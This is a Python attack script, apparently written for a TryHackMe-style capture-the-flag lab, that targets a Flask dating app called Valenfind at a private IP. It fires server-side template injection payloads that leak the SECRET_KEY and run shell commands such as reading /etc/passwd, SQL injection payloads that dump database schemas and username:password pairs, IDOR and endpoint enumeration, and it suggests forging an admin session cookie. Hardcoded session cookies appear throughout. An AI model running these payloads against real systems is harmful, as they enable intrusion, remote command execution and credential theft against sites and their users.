#!/usr/bin/env python3
"""Valenfind all-in-one flag hunter (no parameters).

Approach:
1) Decode Flask session cookies -> extract user_id, username
2) SSTI in profile fields -> leak SECRET_KEY via {{config}}
3) If SECRET_KEY found -> forge admin session -> grab flags
4) IDOR: iterate user profiles /profile/<id>, /user/<id>, /my_profile with tampered cookies
5) SQLi in profile fields -> dump data
6) Endpoint enumeration -> find hidden pages with flags
"""

from __future__ import annotations

import base64
import json
import re
import time
import zlib
from typing import Any, Dict, List, Optional

import requests

BASE_URL = "http://10.112.165.127:5000"
TIMEOUT = 10

COOKIES = [
    "eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiMTIzIn0.aeFLFA.efdhJ78NfiztsKIzas2UVa5PXzw",
    ".eJwljEEKwjAUBa_yfesiqCu78wbupZRP-qrBpCn5yaKU3t2Aq5nZzI5xDmofGvrXDikNiDTTN9Hh4VyqSxGXqYXTSZ6BahSX4hpYKFuqWdacZh94xnAMHYL_cmqbptWYR9_i_vdFI9Hjcr3h-AEITyjz.aeFLFA.qlotgrsCHcBudjmxf4eS5QO9y1A",
]

FLAG_RE = re.compile(r"THM\{[^}]+\}")
ALL_FLAGS: List[str] = []


def collect_flags(text: str, source: str) -> None:
    for f in FLAG_RE.findall(text):
        if f not in ALL_FLAGS:
            ALL_FLAGS.append(f)
            print(f"[!!!] FLAG FOUND ({source}): {f}")


# ── Flask session decode ─────────────────────────────────────────────────────
def flask_decode_payload(cookie: str) -> Optional[Dict[str, Any]]:
    """Decode Flask session cookie payload (unsigned, just base64/zlib)."""
    try:
        payload = cookie.split(".")[0]
        compressed = payload.startswith(".")
        if compressed:
            payload = payload[1:]

        # Flask uses URL-safe base64 with stripped padding
        pad = 4 - len(payload) % 4
        if pad != 4:
            payload += "=" * pad

        raw = base64.urlsafe_b64decode(payload)

        if compressed:
            raw = zlib.decompress(raw)

        return json.loads(raw)
    except Exception as exc:
        print(f"[decode] failed: {exc}")
        return None


# ── Session helper ────────────────────────────────────────────────────────────
def make_session(cookie_value: str) -> requests.Session:
    s = requests.Session()
    s.cookies.set("session", cookie_value)
    return s


def get_text(sess: requests.Session, path: str) -> str:
    url = f"{BASE_URL}{path}"
    try:
        r = sess.get(url, timeout=TIMEOUT, allow_redirects=True)
        return r.text
    except Exception:
        return ""


def post_form(sess: requests.Session, path: str, data: Dict[str, str]) -> str:
    url = f"{BASE_URL}{path}"
    try:
        r = sess.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
        return r.text
    except Exception:
        return ""


def parse_form_fields(body: str) -> List[str]:
    fields = []
    for m in re.finditer(r"name\s*=\s*['\"]([^'\"]+)['\"]", body, re.I):
        name = m.group(1)
        if name not in fields:
            fields.append(name)
    return fields


# ── Phase 1: Decode cookies ──────────────────────────────────────────────────
def phase1_decode() -> None:
    print("\n" + "=" * 72)
    print("[Phase 1] Decoding Flask session cookies")
    print("=" * 72)

    for i, c in enumerate(COOKIES, 1):
        data = flask_decode_payload(c)
        if data:
            print(f"[cookie-{i}] decoded: {json.dumps(data, indent=2)}")
        else:
            print(f"[cookie-{i}] could not decode")


# ── Phase 2: SSTI ────────────────────────────────────────────────────────────
def phase2_ssti() -> None:
    print("\n" + "=" * 72)
    print("[Phase 2] SSTI probes in /complete_profile fields")
    print("=" * 72)

    sess = make_session(COOKIES[0])

    # Get form fields
    body = get_text(sess, "/complete_profile")
    fields = parse_form_fields(body)
    print(f"[ssti] form fields: {fields}")

    ssti_payloads = [
        ("{{7*7}}", "49"),
        ("{{config}}", "SECRET_KEY"),
        ("{{config.SECRET_KEY}}", None),
        ("{{self.__init__.__globals__}}", "SECRET_KEY"),
        ("${7*7}", "49"),
        ("#{7*7}", "49"),
        ("{{request.application.__self__._get_data_for_json.__code__}}", "code"),
        ("{{get_flashed_messages.__globals__}}", None),
        ("{{url_for.__globals__}}", "current_app"),
        ("{{url_for.__globals__['current_app'].config}}", "SECRET_KEY"),
        ("{{lipsum.__globals__['os'].popen('id').read()}}", "uid"),
        ("{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}", "root"),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "subprocess"),
    ]

    for payload, indicator in ssti_payloads:
        data = {}
        for f in fields:
            fl = f.lower()
            if "mail" in fl:
                data[f] = "ssti@test.com"
            elif "phone" in fl or "tel" in fl:
                data[f] = "123456789"
            else:
                data[f] = payload

        resp_post = post_form(sess, "/complete_profile", data)
        resp_profile = get_text(sess, "/my_profile")

        collect_flags(resp_post, f"ssti-post({payload[:30]})")
        collect_flags(resp_profile, f"ssti-profile({payload[:30]})")

        # Check if SSTI evaluated
        found_indicator = False
        if indicator:
            if indicator in resp_profile:
                found_indicator = True
            if indicator in resp_post:
                found_indicator = True

        # Check for "49" specifically for {{7*7}}
        if payload == "{{7*7}}" and "49" in resp_profile and "{{7*7}}" not in resp_profile:
            found_indicator = True

        status = "HIT" if found_indicator else "no"
        print(f"[ssti] {payload[:50]:<50} -> indicator={status}")

        if found_indicator:
            # Extract SECRET_KEY if present
            sk = re.search(r"SECRET_KEY['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]", resp_profile)
            if not sk:
                sk = re.search(r"SECRET_KEY['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]", resp_post)
            if sk:
                print(f"[ssti] SECRET_KEY extracted: {sk.group(1)}")

            # Print interesting chunks
            for text, label in [(resp_profile, "profile"), (resp_post, "post")]:
                if indicator and indicator in text:
                    idx = text.index(indicator)
                    snippet = text[max(0, idx - 100):idx + 300]
                    snippet = re.sub(r"<[^>]+>", " ", snippet)
                    snippet = re.sub(r"\s+", " ", snippet).strip()
                    print(f"[ssti] {label} snippet: {snippet[:400]}")


# ── Phase 3: IDOR ────────────────────────────────────────────────────────────
def phase3_idor() -> None:
    print("\n" + "=" * 72)
    print("[Phase 3] IDOR - enumerate user profiles")
    print("=" * 72)

    sess = make_session(COOKIES[0])

    # Try various profile URL patterns
    patterns = [
        "/profile/{id}",
        "/user/{id}",
        "/users/{id}",
        "/view_profile/{id}",
        "/profiles/{id}",
        "/api/user/{id}",
        "/api/users/{id}",
        "/api/profile/{id}",
    ]

    # First check which patterns exist
    print("[idor] checking URL patterns...")
    valid_patterns = []
    for pattern in patterns:
        url = f"{BASE_URL}{pattern.format(id=1)}"
        try:
            r = sess.get(url, timeout=TIMEOUT, allow_redirects=True)
            if r.status_code != 404:
                valid_patterns.append(pattern)
                print(f"[idor] {pattern} -> {r.status_code} ({len(r.text)} bytes)")
                collect_flags(r.text, f"idor-{pattern}")
        except Exception:
            pass

    if not valid_patterns:
        print("[idor] no valid profile URL patterns found, trying /my_profile only")
        valid_patterns = ["/my_profile"]

    # Iterate user IDs 1-20
    print("[idor] iterating user IDs 1-20...")
    for uid in range(1, 21):
        for pattern in valid_patterns:
            if "{id}" in pattern:
                path = pattern.format(id=uid)
            else:
                path = pattern

            text = get_text(sess, path)
            if not text or len(text) < 50:
                continue

            collect_flags(text, f"idor-uid{uid}")

            # Check for interesting content
            if any(kw in text.lower() for kw in ["admin", "flag", "secret", "thm{"]):
                snippet = re.sub(r"<[^>]+>", " ", text)
                snippet = re.sub(r"\s+", " ", snippet).strip()
                print(f"[idor] uid={uid} interesting: {snippet[:200]}")


# ── Phase 4: SQLi ────────────────────────────────────────────────────────────
def phase4_sqli() -> None:
    print("\n" + "=" * 72)
    print("[Phase 4] SQLi in /complete_profile fields")
    print("=" * 72)

    sess = make_session(COOKIES[0])
    body = get_text(sess, "/complete_profile")
    fields = parse_form_fields(body)

    sqli_payloads = [
        "' OR '1'='1'--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT 1,2,3,4,5,6--",
        "' UNION SELECT 1,2,3,4,5,6,7--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT sql,NULL,NULL,NULL,NULL FROM sqlite_master--",
        "' UNION SELECT name,sql,NULL,NULL,NULL FROM sqlite_master--",
        "' UNION SELECT group_concat(name),NULL,NULL,NULL,NULL FROM sqlite_master--",
        "' UNION SELECT group_concat(sql),NULL,NULL,NULL,NULL FROM sqlite_master--",
        "'; SELECT * FROM users--",
        "' OR 1=1 UNION SELECT group_concat(username||':'||password),2,3,4,5 FROM users--",
    ]

    for payload in sqli_payloads:
        data = {}
        for f in fields:
            fl = f.lower()
            if "mail" in fl:
                data[f] = "sqli@test.com"
            elif "phone" in fl or "tel" in fl:
                data[f] = "123456789"
            else:
                data[f] = payload

        resp_post = post_form(sess, "/complete_profile", data)
        resp_profile = get_text(sess, "/my_profile")

        collect_flags(resp_post, f"sqli-post")
        collect_flags(resp_profile, f"sqli-profile")

        # Check for DB errors or leaked data
        interesting = False
        for text in [resp_post, resp_profile]:
            if re.search(r"sqlite|sql syntax|mysql|postgres|database error|CREATE TABLE|INSERT INTO", text, re.I):
                interesting = True
                snippet = re.sub(r"<[^>]+>", " ", text)
                snippet = re.sub(r"\s+", " ", snippet).strip()
                print(f"[sqli] DB leak with: {payload[:40]}")
                print(f"[sqli] snippet: {snippet[:400]}")

        if not interesting:
            print(f"[sqli] {payload[:50]:<50} -> no DB error")


# ── Phase 5: Endpoint enumeration ────────────────────────────────────────────
def phase5_endpoints() -> None:
    print("\n" + "=" * 72)
    print("[Phase 5] Endpoint enumeration")
    print("=" * 72)

    sess = make_session(COOKIES[0])

    wordlist = [
        "/", "/login", "/register", "/logout", "/admin", "/admin/",
        "/dashboard", "/flag", "/flags", "/secret", "/debug",
        "/config", "/settings", "/api", "/api/users", "/api/flag",
        "/api/profiles", "/api/config", "/robots.txt", "/sitemap.xml",
        "/static/", "/.env", "/console", "/shell",
        "/complete_profile", "/my_profile", "/profiles", "/users",
        "/matches", "/likes", "/liked", "/like", "/unlike",
        "/swipe", "/chat", "/messages", "/inbox",
        "/search", "/find", "/browse", "/discover",
        "/about", "/contact", "/help", "/faq",
        "/profile/1", "/profile/2", "/profile/admin",
        "/user/1", "/user/admin", "/user/0",
        "/view_profile/1", "/view_profile/admin",
        "/edit_profile", "/update_profile",
        "/report", "/block", "/unblock",
        "/notifications", "/feed", "/home",
        "/superlike", "/boost", "/premium",
    ]

    print(f"[enum] testing {len(wordlist)} endpoints...")
    interesting = []

    for path in wordlist:
        url = f"{BASE_URL}{path}"
        try:
            r = sess.get(url, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            continue

        if r.status_code == 404:
            continue

        collect_flags(r.text, f"enum-{path}")

        size = len(r.text)
        has_flag_kw = any(kw in r.text.lower() for kw in ["flag", "thm{", "secret", "admin"])

        if r.status_code != 404:
            marker = ""
            if has_flag_kw:
                marker = " *** INTERESTING ***"
                interesting.append((path, r.status_code, size))
            print(f"[enum] {path:<35} -> {r.status_code} ({size} bytes){marker}")

    if interesting:
        print("\n[enum] Interesting endpoints:")
        for path, code, size in interesting:
            print(f"  {path} -> {code} ({size} bytes)")


# ── Phase 6: Inspect all accessible pages for flags ──────────────────────────
def phase6_deep_inspect() -> None:
    print("\n" + "=" * 72)
    print("[Phase 6] Deep content inspection")
    print("=" * 72)

    for i, cv in enumerate(COOKIES, 1):
        sess = make_session(cv)
        print(f"\n[deep] using cookie-{i}")

        for path in ["/", "/my_profile", "/complete_profile", "/matches",
                     "/likes", "/liked", "/browse", "/discover", "/dashboard",
                     "/home", "/feed", "/profiles", "/search"]:
            text = get_text(sess, path)
            if not text or len(text) < 50:
                continue

            collect_flags(text, f"deep-cookie{i}-{path}")

            # Look for hidden content, comments, data attributes
            comments = re.findall(r"<!--(.*?)-->", text, re.S)
            for c in comments:
                if any(kw in c.lower() for kw in ["flag", "thm", "secret", "key", "admin", "todo", "fixme", "hack"]):
                    print(f"[deep] {path} HTML comment: {c.strip()[:200]}")

            # Check for inline JS with secrets
            scripts = re.findall(r"<script[^>]*>(.*?)</script>", text, re.S | re.I)
            for sc in scripts:
                if any(kw in sc.lower() for kw in ["flag", "thm", "secret", "key", "api_key"]):
                    print(f"[deep] {path} script content: {sc.strip()[:200]}")

            # Data attributes
            data_attrs = re.findall(r'data-[a-z_-]+\s*=\s*"([^"]*)"', text, re.I)
            for da in data_attrs:
                if any(kw in da.lower() for kw in ["flag", "thm", "secret"]):
                    print(f"[deep] {path} data-attr: {da[:200]}")


# ── Phase 7: Like/match flow (dating app specific) ───────────────────────────
def phase7_dating_flow() -> None:
    print("\n" + "=" * 72)
    print("[Phase 7] Dating app specific flows (like/match)")
    print("=" * 72)

    sess = make_session(COOKIES[0])

    # Try liking all users 1-20
    like_endpoints = ["/like", "/swipe", "/superlike"]
    for ep in like_endpoints:
        for uid in range(1, 21):
            for method in ["post_json", "post_form", "get"]:
                try:
                    if method == "post_json":
                        r = sess.post(f"{BASE_URL}{ep}", json={"user_id": uid}, timeout=TIMEOUT)
                    elif method == "post_form":
                        r = sess.post(f"{BASE_URL}{ep}", data={"user_id": uid}, timeout=TIMEOUT)
                    else:
                        r = sess.get(f"{BASE_URL}{ep}/{uid}", timeout=TIMEOUT)

                    if r.status_code != 404:
                        collect_flags(r.text, f"like-{ep}-uid{uid}")
                        if uid <= 3 or "thm" in r.text.lower() or "flag" in r.text.lower():
                            print(f"[dating] {ep} uid={uid} ({method}) -> {r.status_code} ({len(r.text)} bytes)")
                except Exception:
                    pass

    # Check matches page
    for path in ["/matches", "/my_matches", "/chat", "/messages"]:
        text = get_text(sess, path)
        if text and len(text) > 50:
            collect_flags(text, f"dating-{path}")
            print(f"[dating] {path} -> {len(text)} bytes")


def main() -> None:
    print("Valenfind All-in-One Flag Hunter")
    print(f"Target: {BASE_URL}")
    print("=" * 72)

    phase1_decode()
    phase2_ssti()
    phase3_idor()
    phase4_sqli()
    phase5_endpoints()
    phase6_deep_inspect()
    phase7_dating_flow()

    print("\n" + "=" * 72)
    print("[SUMMARY]")
    print("=" * 72)

    if ALL_FLAGS:
        print(f"FLAGS FOUND ({len(ALL_FLAGS)}):")
        for f in ALL_FLAGS:
            print(f"  {f}")
    else:
        print("No flags found yet.")
        print("Possible next steps:")
        print("  - Check output above for SECRET_KEY / SSTI hits")
        print("  - If SECRET_KEY found, forge admin cookie with flask-unsign")
        print("  - Check for other injection points in POST bodies")
        print("  - Try different cookie names or auth mechanisms")


if __name__ == "__main__":
    main()
